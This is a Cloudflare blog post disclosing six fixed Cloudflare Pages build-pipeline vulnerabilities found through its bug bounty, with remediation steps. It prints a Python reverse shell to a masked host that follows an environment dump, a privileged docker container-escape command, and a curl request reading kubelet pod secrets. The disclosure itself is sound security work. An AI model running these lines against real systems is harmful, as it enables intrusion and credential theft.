---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-05-06_cloudflare-writeup.md
original_filename: 2022-05-06_cloudflare-writeup.md
title: Cloudflare writeup
category: blogs
detected_topics:
- access-control
- command-injection
- oauth
- automation-abuse
- information-disclosure
- api-security
tags:
- imported
- blogs
- access-control
- command-injection
- oauth
- automation-abuse
- information-disclosure
- api-security
language: en
raw_sha256: ce4a40bcc2b2af83954cfb026712b52f3fcdde07216ce276f1efa2c30ed9b83d
text_sha256: e510e4798cd87ebf11af29c587f9d44078c6599cfead36066f50e9ab9e0999bf
ingested_at: '2026-06-28T07:32:11Z'
sensitivity: unknown
redactions_applied: false
---

# Cloudflare writeup

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-05-06_cloudflare-writeup.md
- Source Type: markdown
- Detected Topics: access-control, command-injection, oauth, automation-abuse, information-disclosure, api-security
- Ingested At: 2026-06-28T07:32:11Z
- Redactions Applied: False
- Raw SHA256: `ce4a40bcc2b2af83954cfb026712b52f3fcdde07216ce276f1efa2c30ed9b83d`
- Text SHA256: `e510e4798cd87ebf11af29c587f9d44078c6599cfead36066f50e9ab9e0999bf`


## Content

---
title: "Cloudflare writeup"
page_title: "The Cloudflare Bug Bounty program and Cloudflare Pages"
url: "https://blog.cloudflare.com/pages-bug-bounty/"
final_url: "https://blog.cloudflare.com/pages-bug-bounty/"
authors: ["Sean Yeoh (@seanyeoh)", "James Hebden (@devec0)"]
programs: ["Cloudflare"]
bugs: ["Command injection", "Container escape", "Bash Path injection", "RCE", "Local Privilege Escalation", "Information disclosure"]
publication_date: "2022-05-06"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2658
---

# The Cloudflare Bug Bounty program and Cloudflare Pages

2022-05-06

  * [![Evan Johnson](https://blog.cloudflare.com/cdn-cgi/image/format=auto,dpr=3,width=64,height=64,gravity=face,fit=crop,zoom=0.5/https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5J6PnIcAVcLV5ADBAufXhJ/77bd98c759e81efc7e600fa81f556ca9/evan-johnson.png)](/author/evan-johnson/)

[Evan Johnson](/author/evan-johnson/)

  * [![Natalie Rogers](https://blog.cloudflare.com/cdn-cgi/image/format=auto,dpr=3,width=64,height=64,gravity=face,fit=crop,zoom=0.5/https://cf-assets.www.cloudflare.com/zkvhlag99gkb/7yLLjP9Y2l0cJdBrPMfrre/73f6d2b7a9c41cdf2f3dc9a5016d3a8d/natalie.png)](/author/natalie/)

[Natalie Rogers](/author/natalie/)

6 min read

![](https://cf-assets.www.cloudflare.com/zkvhlag99gkb/a39MVuDKO1VnorPnZPIap/dc6d26bab71204b7a4a5dd9f7b26d898/pages-bug-bounty.png)

 _The Cloudflare Pages team recently collaborated closely with security researchers at_ [_Assetnote_](https://assetnote.io/) _through our_ [_Public Bug Bounty_](https://hackerone.com/cloudflare) _. Throughout the process we found and have fully patched vulnerabilities discovered in Cloudflare Pages. You can read their detailed_ [_write-up here_](https://blog.assetnote.io/2022/05/06/cloudflare-pages-pt1/) _. There is no outstanding risk to Pages customers. In this post we share information about the research that could help others make their infrastructure more secure, and also highlight our bug bounty program that helps to make our product more secure._

Cloudflare cares deeply about security and protecting our users and customers — in fact, it’s a big part of the reason we’re here. But how does this manifest in terms of how we run our business? There are a number of ways. One very important prong of this is our [bug bounty program](/cloudflare-bug-bounty-program/) that facilitates and rewards security researchers for their collaboration with us.

But we don’t just fix the security issues we learn about — in order to build trust with our customers and the community more broadly, we are transparent about incidents and bugs that we find.

Recently, we worked with a group of researchers on improving the security of Cloudflare Pages. This collaboration resulted in several security vulnerability discoveries that we quickly fixed. We have no evidence that malicious actors took advantage of the vulnerabilities found. Regardless, we notified the limited number of customers that might have been exposed.

In this post we are publicly sharing what we learned, and the steps we took to remediate what was identified. We are thankful for the collaboration with the researchers, and encourage others to [use the bounty program](https://hackerone.com/cloudflare) to work with us to help us make our services — and by extension the Internet — more secure!

## What happens when a vulnerability is reported?

Once a vulnerability has been reported via HackerOne, it flows into our vulnerability management process:

  1. We investigate the issue to understand the criticality of the report.

  2. We work with the engineering teams to scope, implement, and validate a fix to the problem. For urgent problems we start working with engineering immediately, and less urgent issues we track and prioritize alongside engineering’s normal bug fixing cadences.

  3. Our Detection and Response team investigates high severity issues to see whether the issue was exploited previously.

This process is flexible enough that we can prioritize important fixes same-day, but we never lose track of lower criticality issues.

## What was discovered in Cloudflare Pages?

The Pages team had to solve a pretty difficult problem for Cloudflare Builds (our [CI/CD build pipeline](https://www.cloudflare.com/learning/serverless/glossary/what-is-ci-cd/)): how can we run untrusted code safely in a multi-tenant environment? Like all complex engineering problems, getting this right has been an iterative process. In all cases, we were able to quickly and definitively address bugs reported by security researchers. However, as we continued to work through reports by the researchers, it became clear that our initial build architecture decisions provided too large an [attack surface](https://www.cloudflare.com/learning/security/what-is-an-attack-surface/). The Pages team pivoted entirely and re-architected our platform in order to use gVisor and further isolate builds.

When determining impact, it is not enough to find no evidence that a bug was exploited, _we must conclusively prove that it was not exploited_. For almost all the bugs reported, we found definitive signals in audit logs and were able to correlate that data exclusively against activity by trusted security researchers.

However, for one bug, _while we found no evidence that the bug was exploited beyond the work of security researchers_ , we were not able meaningfully prove that it was not. In the spirit of full transparency, we notified all Pages users that may have been impacted.

Now that all the issues have been remedied, and individual customers have been notified, we’d like to share more information about the issues.

### Bug 1: Command injection in CLONE_REPO

With a flaw in our logic during build initialization, it was possible to execute arbitrary code, echo environment variables to a file and then read the contents of that file.

The crux of the bug was that `root_dir` in this line of code was attacker controlled. After gaining control the researcher was able to specially craft a malicious `root_dir` to dump the environment variables of the process to a file. Those environment variables contained our GitHub bot’s authorization key. This would have allowed the attacker to read the repositories of other Pages' customers, and many of those repositories are private.

After fixing the input validation for this field to prevent the bug, and rolling the disclosed keys, we investigated all other paths that had ever been set by our Pages customers to see if this attack had ever been performed by any other (potentially malicious) security researchers. We had logs showing that this was the first this particular attack had ever been performed, and responsibly reported.

### Bug 2: Command injection in PUBLISH_ASSETS

This bug is nearly identical to the first one, but on the publishing step instead of the clone step. We went to work rotating the secrets that were exposed, fixing the input validation issues, and rotating the exposed secrets. We investigated the Cloudflare audit logs to confirm that the sensitive credentials had not been used by anyone other than our build infrastructure, and within the scope of the security research being performed.

### Bug 3: Cloudflare API key disclosure in the asset publishing process

While building customer pages, a program called /opt/pages/bin/pages-metadata-generator is involved. This program had the Linux permissions of 777, allowing all users on the machine to read the program, execute the program, but most importantly overwrite the program. If you can overwrite the program prior to its invocation, the program might run with higher permissions when the next user comes along and wants to use it.

In this case the attack is simple. When a Pages build runs, the following `build.sh` is specified to run, and it can overwrite the executable with a new one.
  
  
  #!/bin/bash
  cp pages-metadata-generator /opt/pages/bin/pages-metadata-generator

This allows the attacker to provide their own `pages-metadata-generator` program that is run with a populated set of environment variables. The proof of concept provided to Cloudflare was this minimal reverse shell.
  
  
  #!/bin/bash
  echo "henlo fren"
  export > /tmp/envvars
  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x.x",9448));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

With a reverse shell, the attackers only need to run `env` to see a list of environment variables that the program was invoked with. We fixed the file permissions of the process, rotated the credentials, and investigated in Cloudflare audit logs to confirm that the sensitive credentials had not been used by anyone other than our build infrastructure, and within the scope of the security research.

### Bug 4: Bash path injection

This issue was very similar to Bug 3. The PATH environment variable contained a large set of directories for maximum compatibility with different developer tools.

`PATH=/opt/buildhome/.swiftenv/bin:/opt/buildhome/.swiftenv/shims:/opt/buildhome/.php:/opt/buildhome/.binrc/bin:/usr/local/rvm/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/buildhome/.cask/bin:/opt/buildhome/.gimme/bin:/opt/buildhome/.dotnet/tools:/opt/buildhome/.dotnet`

Unfortunately not all of these directories were set to the proper filesystem permissions allowing a malicious version of the program bash to be written to them, and later invoked by the Pages build process. We patched this bug, rotated the impacted credentials, and investigated in Cloudflare audit logs to confirm that the sensitive credentials had not been used by anyone other than our build infrastructure, and within the scope of the security research.

### Bug 5: Azure pipelines escape

Back when this research was conducted we were running Cloudflare Pages on Azure Pipelines. Builds were taking place in highly privileged containers and the containers had the docker socket available to them. Once the researchers had root within these containers, escaping them was trivial after installing docker and mounting the root directory of the host machine.
  
  
  sudo docker run -ti --privileged --net=host -v /:/host -v /dev:/dev -v /run:/run ubuntu:latest

Once they had root on the host machine, they were able to recover Azure DevOps credentials from the host which gave access to the Azure Organization that Cloudflare Pages was running within.

The credentials that were recovered gave access to highly audited APIs where we could validate that this issue was not previously exploited outside this security research.

### Bug 6: Pages on Kubernetes

After receipt of the above bugs, we decided to change the architecture of Pages. One of these changes was migration of the product from Azure to Kubernetes, and simplifying the workflow, so the attack surface was smaller and defensive programming practices were easier to implement. After the change, Pages builds are within Kubernetes Pods and are seeded with the minimum set of credentials needed.

As part of this migration, we left off a very important iptables rule in our Kubernetes control plane, making it easy to `curl` the Kubernetes API and read secrets related to other Pods in the cluster (each Pod representing a separate Pages build).
  
  
  curl -v -k [http://10.124.200.1:10255/pods](http://10.124.200.1:10255/pods)

We quickly patched this issue with iptables rules to block network connections to the Kubernetes control plane. One of the secrets available to each Pod was the GitHub OAuth secret which would have allowed someone who exploited this issue to read the GitHub repositories of other Pages' customers.

In the previously reported issues we had robust logs that showed us that the attacks that were being performed had never been performed by anyone else. The logs related to inspecting Pods were not available to us, so we decided to notify all Cloudflare Pages customers that had ever had a build run on our Kubernetes-based infrastructure. After patching the issue and investigating which customers were impacted, we emailed impacted customers on February 3 to tell them that it’s possible someone other than the researcher had exploited this issue, because our logs couldn’t prove otherwise.

## Takeaways

We are thankful for all the security research performed on our Pages product, and done so at such an incredible depth. CI/CD and build infrastructure security problems are notoriously hard to prevent. A bug bounty that incentivizes researchers to keep coming back is invaluable, and we appreciate working with researchers who were flexible enough to perform great research, and work with us as we re-architected the product for more robustness. An in-depth write-up of these issues is available from the Assetnote team on [their website](https://blog.assetnote.io/2022/05/06/cloudflare-pages-pt1/).

More than this, however, the work of all these researchers is one of the best ways to test the security architecture of any product. While it might seem counter-intuitive after a post listing out a number of bugs, all these diligent eyes on our products allow us to feel much more confident in the security architecture of Cloudflare Pages. We hope that our transparency, and our description of the work done on our security posture, enables you to feel more confident, too.

Finally: if you are a security researcher, we’d love to work with you to make our products more secure. Check out [hackerone.com/cloudflare](https://hackerone.com/cloudflare) for more info!

[Bug Bounty](/tag/bug-bounty/)[Vulnerabilities](/tag/vulnerabilities/)[Security](/tag/security/)
